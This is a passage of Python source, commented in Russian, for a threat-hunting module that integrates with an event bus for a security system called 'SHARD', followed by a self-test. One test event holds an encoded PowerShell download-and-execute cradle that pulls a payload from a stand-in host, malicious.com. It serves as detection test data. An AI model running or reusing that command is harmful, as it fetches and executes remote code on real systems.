    def mark_remediated(self, finding_id: str) -> bool:
        """Отметить находку как исправленную"""
        with self._lock:
            for f in self.findings:
                if f.id == finding_id:
                    f.status = HuntingStatus.REMEDIATED
                    return True
        return False


# ============================================================
# ИНТЕГРАЦИЯ С SHARD
# ============================================================

class ShardThreatHuntingIntegration:
    """Интеграция Threat Hunting AI в SHARD"""

    def __init__(self, config: Dict = None):
        self.config = ThreatHuntingConfig()
        self.engine: Optional[ThreatHuntingEngine] = None
        self.event_bus = None
        self.logger = None

    def setup(self, event_bus, logger):
        """Настройка интеграции"""
        self.event_bus = event_bus
        self.logger = logger
        self.engine = ThreatHuntingEngine(self.config, logger)

        if event_bus:
            event_bus.subscribe('alert.detected', self.on_alert)
            event_bus.subscribe('threat_hunting.hypothesis', self.on_hypothesis_request)
            event_bus.subscribe('threat_hunting.scan', self.on_scan_request)

    def start(self):
        """Запуск интеграции"""
        if self.engine:
            self.engine.start()

        if self.logger:
            self.logger.info("🚀 Threat Hunting AI запущен")

    def stop(self):
        """Остановка интеграции"""
        if self.engine:
            self.engine.stop()

    def on_alert(self, alert: Dict):
        """Обработка алерта для охоты"""
        if self.engine:
            # Добавляем алерт как evidence
            self.engine.add_evidence(alert)

            # Проверяем на критические находки
            findings = self.engine.get_findings(min_severity=HuntingSeverity.HIGH, limit=5)
            for f in findings:
                if f.timestamp > time.time() - 60:  # Только свежие
                    self._publish_hunting_alert(f)

    def on_hypothesis_request(self, data: Dict):
        """Обработка запроса гипотезы"""
        hypothesis_id = data.get('hypothesis_id', '')

        if hypothesis_id and self.engine:
            hypothesis = self.engine.get_hypothesis(hypothesis_id)
            if self.event_bus:
                self.event_bus.publish('threat_hunting.hypothesis.result', {
                    'hypothesis': {
                        'id': hypothesis.id,
                        'name': hypothesis.name,
                        'description': hypothesis.description,
                        'mitre_tactics': hypothesis.mitre_tactics,
                        'mitre_techniques': hypothesis.mitre_techniques,
                        'kql_query': hypothesis.kql_query,
                        'status': hypothesis.status.value
                    } if hypothesis else None,
                    'request_id': data.get('request_id')
                })

    def on_scan_request(self, data: Dict):
        """Обработка запроса сканирования"""
        if self.engine:
            # Генерация новых гипотез
            self.engine.generate_new_hypotheses()

            # Запуск активных гипотез
            self.engine.run_active_hypotheses()

            report = self.engine.generate_report()

            if self.event_bus:
                self.event_bus.publish('threat_hunting.scan.completed', {
                    'report': report,
                    'request_id': data.get('request_id')
                })

    def _publish_hunting_alert(self, finding: HuntingFinding):
        """Публикация находки как алерта"""
        if self.event_bus:
            self.event_bus.publish('alert.detected', {
                'attack_type': 'Threat Hunting Finding',
                'severity': finding.severity.value,
                'score': 0.8 if finding.severity == HuntingSeverity.CRITICAL else 0.6,
                'confidence': finding.confidence,
                'explanation': finding.description,
                'details': {
                    'finding_id': finding.id,
                    'hypothesis_id': finding.hypothesis_id,
                    'mitre_tactics': finding.mitre_tactics,
                    'mitre_techniques': finding.mitre_techniques,
                    'affected_assets': finding.affected_assets,
                    'remediation': finding.remediation
                }
            })

    def get_report(self) -> Dict:
        """Получить отчёт"""
        if self.engine:
            return self.engine.generate_report()
        return {}

    def get_stats(self) -> Dict:
        """Получить статистику"""
        if self.engine:
            return self.engine.get_stats()
        return {}

    def get_mitre_coverage(self) -> Dict:
        """Получить покрытие MITRE"""
        if self.engine:
            return self.engine.get_mitre_coverage()
        return {}


# ============================================================
# ТЕСТИРОВАНИЕ
# ============================================================

def test_threat_hunting():
    """Тестирование Threat Hunting AI"""
    print("=" * 60)
    print("🧪 ТЕСТИРОВАНИЕ THREAT HUNTING AI")
    print("=" * 60)

    config = ThreatHuntingConfig()
    engine = ThreatHuntingEngine(config)

    # Тест 1: Гипотезы
    print(f"\n📝 Тест 1: Загружено гипотез: {len(engine.hypotheses)}")
    for h in list(engine.hypotheses.values())[:3]:
        print(f"   - {h.name} ({h.severity.value})")

    # Тест 2: MITRE покрытие
    print("\n📝 Тест 2: MITRE ATT&CK покрытие")
    coverage = engine.get_mitre_coverage()
    print(f"   Тактик: {coverage['tactics_covered']}/{coverage['total_tactics']}")
    print(f"   Техник: {coverage['techniques_covered']}/{coverage['total_techniques']}")
    print(f"   Покрытие: {coverage['coverage_percent']}%")

    # Тест 3: Sigma правила
    print(f"\n📝 Тест 3: Sigma правил: {len(engine.sigma_engine.rules)}")

    # Тест 4: Добавление evidence
    print("\n📝 Тест 4: Обработка события")
    test_event = {
        'command_line': 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==',
        'src_ip': '192.168.1.100',
        'process_name': 'powershell.exe'
    }
    engine.add_evidence(test_event)
    print("   Событие обработано")

    # Тест 5: Статистика
    print("\n📝 Тест 5: Статистика")
    stats = engine.get_stats()
    for key, value in stats.items():
        print(f"   {key}: {value}")

    print("\n" + "=" * 60)
    print("✅ ТЕСТИРОВАНИЕ ЗАВЕРШЕНО")
    print("=" * 60)


if __name__ == "__main__":
    test_threat_hunting()